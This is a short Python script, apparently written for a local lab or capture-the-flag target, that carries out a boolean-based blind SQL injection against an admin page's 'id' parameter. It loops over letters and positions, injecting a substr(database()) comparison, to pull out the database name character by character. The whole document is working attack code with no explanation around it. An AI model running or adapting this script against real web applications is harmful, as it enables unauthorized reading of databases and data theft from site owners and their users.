#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase
bar = log.progress("Database")

value = ""

for position in range(0,10):
    for character in characters:
        request = requests.get(f"http://127.0.0.1/admin/?id=1'and (select substr(database(),{position},1))='{character}'-- -")
        if "Query was successfully" in request.text:
            value += character
            bar.status(value)
